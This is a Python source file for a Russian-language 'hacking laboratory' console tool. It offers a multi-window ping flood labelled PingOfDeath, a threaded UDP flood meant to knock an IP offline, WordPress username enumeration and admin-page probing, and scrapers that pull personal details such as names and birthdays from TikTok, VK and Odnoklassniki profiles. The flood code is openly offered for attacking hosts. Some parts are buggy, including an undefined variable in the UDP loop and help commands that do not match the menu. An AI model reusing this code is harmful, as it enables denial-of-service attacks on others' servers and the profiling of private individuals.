from colorama import init
from colorama import Fore, Back, Style
from pystyle import Colors, Colorate
import pystyle
import time
import datetime
import os
import requests
from bs4 import BeautifulSoup
import random
import socket
import threading
import webbrowser
import lxml
import sys
import builtwith
import json

init(autoreset=True)


def art():
    print(Fore.RED + '''


	██████╗  ██╗███╗   ███╗ ██████╗ ███╗   ██╗ ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗            
	██╔══██╗███║████╗ ████║██╔═══██╗████╗  ██║██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝            
	██║  ██║╚██║██╔████╔██║██║   ██║██╔██╗ ██║██║     ███████║█████╗  ██║     █████╔╝             
	██║  ██║ ██║██║╚██╔╝██║██║   ██║██║╚██╗██║██║     ██╔══██║██╔══╝  ██║     ██╔═██╗             
	██████╔╝ ██║██║ ╚═╝ ██║╚██████╔╝██║ ╚████║╚██████╗██║  ██║███████╗╚██████╗██║  ██╗            
	╚═════╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝            
	██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗                                         
	██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝                                         
	███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗                                        
	██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║                                        
	██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝                                        
	╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝                                         
	██╗      █████╗ ██████╗  ██████╗ ██████╗  █████╗ ████████╗ ██████╗ ██████╗ ██╗███████╗███████╗
	██║     ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗██║██╔════╝██╔════╝
	██║     ███████║██████╔╝██║   ██║██████╔╝███████║   ██║   ██║   ██║██████╔╝██║█████╗  ███████╗
	██║     ██╔══██║██╔══██╗██║   ██║██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗██║██╔══╝  ╚════██║
	███████╗██║  ██║██████╔╝╚██████╔╝██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║██║███████╗███████║
	╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝''')


def checker():
    url = input('URL: ')
    getbrowser = 'https://check-host.net/check-http?host=' + url
    webbrowser.open(getbrowser, new=2)
    print('Готово!')


def ping():
    host = input('Хост: ')
    packets = input('Размер пакетов: ')
    threads = int(input('Количество окон: '))
    for i in range(threads):
        os.system('start ping ' + host + ' -l ' + packets + ' -t')

def tiktokparsing():
    username = input('TikTok username (without @): ')
    link = 'https://socialblade.com/tiktok/user/' + username
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
        'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3'
    }
    response = requests.get(link, headers=headers)
    soup = BeautifulSoup(response.text, 'lxml')
    if soup.find('div', attrs={'style': 'width: 800px; padding: 40px; background: #ddac99; margin: 0px auto; color:#fff; text-align: center; font-weight: bold;'}) is not None:
        print(Fore.RED + 'У этого аккаунта меньше 25000 тысяч подписчиков, поэтому его нет в базе данных.')
    else:
        unwanted = soup.find('div', attrs={'style': 'float: right; opacity: 0.7; font-weight: bold;'})
        unwanted.extract()
        infos = soup.find_all('div', class_='YouTubeUserTopInfo')
        counts = []

        for i in infos:
            itemName = i.find('span', class_='YouTubeUserTopLight')
            itemCount = i.find('span', attrs={'style': 'font-weight: bold;'})
            print(f'{itemName.text}: {itemCount.text}')
            counts.append(f'{itemName.text}: {itemCount.text}')

        saveit = input('Сохранить в TXT файл? (y or n): ')
        if saveit == 'Y' or saveit == 'y':
            with open('TikTokData.txt', 'w') as file:
                file.write('Username: ' + username + '\n' + '\n'.join(counts))
                file.close()

def vkparsing():
    url = input('VK (url): ')
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
        'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3'
    }
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.text, 'lxml')
    name = soup.find('h1', class_='page_name').text
    infos = soup.find_all('a', class_='page_counter')
    counts = []
    print(name)

    for i in infos:
        itemName = i.find('div', class_='label')
        itemCount = i.find('div', class_='count')
        print(f'{itemName.text}: {itemCount.text}')
        counts.append(f'{itemName.text}: {itemCount.text}')
    saveit = input('Сохранить в TXT файл? (y or n): ')
    if saveit == 'Y' or saveit == 'y':
        with open('VKdata.txt', 'w') as file:
            file.write('URL: ' + url + '\n' + '\n'.join(counts))
            file.close()

def okparsing():
    url = input('OK (url): ')
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    name = soup.find('a', class_='profile-user-info_name')
    birthday = soup.find('div', attrs={"data-type": "AGE"})
    living = soup.find('div', class_="user-profile_i_value ellip", attrs={"data-type": "TEXT"})
    photo = soup.find('a', class_='recent-photos_total-counter')
    friends = soup.find('a', attrs={"data-l": "outlandermenu,friendFriend"}).find('span')
    groups = soup.find('a', attrs={"data-l": "outlandermenu,friendAltGroup"}).find('span')
    games = soup.find('a', attrs={"data-l": "outlandermenu,friendApps"}).find('span')

    print('Пользователь: ' + name.text)
    print('Дата рождения: ' + birthday.text)
    print('Количество друзей: ' + friends.text)
    print('Количество групп: ' + groups.text)
    print('Количество фотографий: ' + photo.text)
    print('Количество игр: ' + games.text)
    saveit = input('Сохранить в TXT файл? (y or n): ')
    if saveit == 'Y' or saveit == 'y':
        with open('OKdata.txt', 'w') as file:
            file.write('URL: ' + url + '\nПользователь: ' + name.text + '\nДата рождения: ' + birthday.text + '\nКоличество друзей: ' + friends.text + '\nКоличество групп: ' + groups.text + '\nКоличество фотографий: ' + photo.text + '\nКоличество игр: ' + games.text)
            file.close()

def launchudp(ip, port, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=attackudp, args=(ip, port, until))
            thd.start()
        except:
            pass

def attackudp(ip, port, until_datetime):
    data = random._urandom(1024)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        i = random.choice(('[*]', '[!]', '[#]'))
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(t):
                s.sendto(data, addr)
                print(Fore.GREEN + i + ' Отправлено!')
        except:
            print(Fore.RED + '[@] Ошибка!')

def UrlTools(Url):
    if Url.lower().startswith('https://') or Url.lower().startswith('http://'):
        Url = Url.replace('http://','').replace('https://','')
    return Url

def getusernamewordpress(Url):
    Headers = {
    'Accept':'*/*',
    'Content-Type':'application/x-www-form-urlencoded',
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
    }
    r = requests.get(Url+'/wp-json/wp/v2/users/',headers=Headers).text
    j = json.loads(r)
    Count = len(j) - 1
    cn = 0
    User = ''
    for Val in j:
        Split = '\n'
        if Count == cn:
            Split = ''
        U = j[cn]['slug']
        if not U == '':
            User += Fore.GREEN + '   ' + '[+] ' + U + Split
        cn += 1
    if User == '':
        User = Fore.RED + 'Не найдено!'
    return User

def adminpage(Url):
    r = requests.get(Url+'/wp-admin',allow_redirects=False)
    AdminPageuRL = ''
    if r.status_code == 200:
        AdminPageuRL = Fore.RED + 'Не найдено!'
    elif r.status_code == 301:
        AdminPageuRL = Fore.GREEN + '   ' + Url +'/wp-admin'
    return AdminPageuRL

def infoaboutwebsite(Url):
    B = builtwith.parse(Url)
    Last = ''
    for N in B:
        Last = N
    Info = ''
    Count = 0
    for Name in B:
        Count = len(B[Name]) -1
        Values = ''
        for Value in B[Name]:
            Split = ' | '
            if Value == B[Name][Count]:
                Split = ''
            Values += Value+Split
        if Name == Last:
            Info += Fore.GREEN + '   ' + '[+]'+Name.replace('-','').title()+': '+Values
        else:
            Info += Fore.GREEN + '   '+'[+]'+Name.replace('-',' ').title()+': '+Values+'\n'

    return Info

def wordpressgetinfo(Target):
    Url = UrlTools(Target).title()
    Ip = socket.gethostbyname(Url)
    Username = Fore.YELLOW + '[+] '+'Пользователи: \n' + getusernamewordpress('http://' + Url)
    AdminpageUrl = Fore.YELLOW + '[+] '+'Админка: \n' + adminpage('http://' + Url)
    Infowebsite = Fore.YELLOW + '[+] '+'Информация: \n' + infoaboutwebsite('http://' + Url)
    print(Fore.RED + 'Домен: ' + Url + '\nIP: ' + Ip + '\n' + Infowebsite + '\n' + Username + '\n' + AdminpageUrl)
    

art()

while True:
    time.sleep(1.25)
    start = input(Colorate.Horizontal(Colors.purple_to_red, '''
    
    ╔═══[root@Hacker]
    ╚══> ''', 1))
    if start == 'help':
        print(Fore.GREEN + '''
		$ checkhost - проверка хоста на работоспособность
		$ ping - нагрузка сервера многопоточными Ping запросами (PingOfDeath)
		$ tiktokpasrser - парсинг данных с ТикТока
		$ vkpasrser - парсинг данных с ВКонтакте
		$ okparser - парсинг данных с одноклассников
		$ udpflood - атака на IP до отказа (UDP)
		$ wordpress - информация о CMS Wordpress
		$ clear - очистка консоли
		''')
        pass
    if start == 'checkhost':
        os.system('cls')
        checker()
    if start == 'ping':
        os.system('cls')
        ping()
    if start == 'okparser':
        os.system('cls')
        okparsing()
    if start == 'clear':
        os.system('cls')
        pass
    if start == 'udpflood':
        os.system('cls')
        ip = str(input('IP: '))
        port = int(input('Port: '))
        thread = int(input('Thread: '))
        t = int(input('Times: '))
        launchudp(ip, port, thread, t)
    if start == 'tiktokparser':
        os.system('cls')
        tiktokparsing()
    if start == 'vkparser':
        os.system('cls')
        vkparsing()
    if start == 'wordpress':
        os.system('cls')
        Target = str(input('URL: '))
        wordpressgetinfo(Target)
